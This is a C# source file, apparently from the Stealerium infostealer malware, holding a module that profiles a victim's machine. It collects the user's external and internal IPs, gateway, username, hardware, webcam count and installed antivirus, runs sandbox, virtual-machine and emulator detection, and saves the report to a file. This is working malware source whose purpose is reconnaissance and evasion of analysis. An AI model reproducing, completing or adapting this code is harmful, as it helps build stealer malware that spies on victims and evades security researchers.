using System;
using System.IO;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Modules.Implant;

namespace Stealerium.Stub.Target.System
{
    internal sealed class SysInfo
    {
        /// <summary>
        /// Saves system information to the specified path.
        /// </summary>
        /// <param name="sSavePath">The file path where system info will be saved.</param>
        public static void Save(string sSavePath)
        {
            try
            {
                // Fetch hosting status synchronously only if anti-analysis is enabled
                bool hostingStatus = Config.AntiAnalysis == "1" ? AntiAnalysis.Run() : false;

                // Fetch external IP synchronously
                string externalIp = SystemInfo.GetPublicIpAsync().GetAwaiter().GetResult();

                var systemInfoText = ""
                                     + "\n[IP]"
                                     + "\nExternal IP: " + externalIp
                                     + "\nInternal IP: " + SystemInfo.GetLocalIp()
                                     + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                                     + "\n"
                                     + "\n[Machine]"
                                     + "\nUsername: " + SystemInfo.Username
                                     + "\nCompname: " + SystemInfo.Compname
                                     + "\nSystem: " + SystemInfo.GetSystemVersion()
                                     + "\nCPU: " + SystemInfo.GetCpuName()
                                     + "\nGPU: " + SystemInfo.GetGpuName()
                                     + "\nRAM: " + SystemInfo.GetRamAmount()
                                     + "\nDATE: " + SystemInfo.Datenow
                                     + "\nSCREEN: " + SystemInfo.ScreenMetrics()
                                     + "\nBATTERY: " + SystemInfo.GetBattery()
                                     + "\nWEBCAMS COUNT: " + WebcamScreenshot.GetConnectedCamerasCount()
                                     + "\n"
                                     + "\n[Virtualization]"
                                     + "\nVirtualMachine: " + AntiAnalysis.VirtualBox()
                                     + "\nSandBoxie: " + AntiAnalysis.SandBox()
                                     + "\nEmulator: " + AntiAnalysis.Emulator()
                                     + "\nProcesses: " + AntiAnalysis.SuspiciousProcess()
                                     + "\nHosting: " + hostingStatus
                                     + "\nAntivirus: " + SystemInfo.GetAntivirus()
                                     + "\n";

                // Output the system info to the console
                Console.WriteLine(systemInfoText);

                // Save the system info to a file synchronously
                File.WriteAllText(sSavePath, systemInfoText);
            }
            catch (Exception ex)
            {
                Logging.Log("SysInfo >> Failed to fetch system info\n" + ex.Message);
            }
        }
    }
}
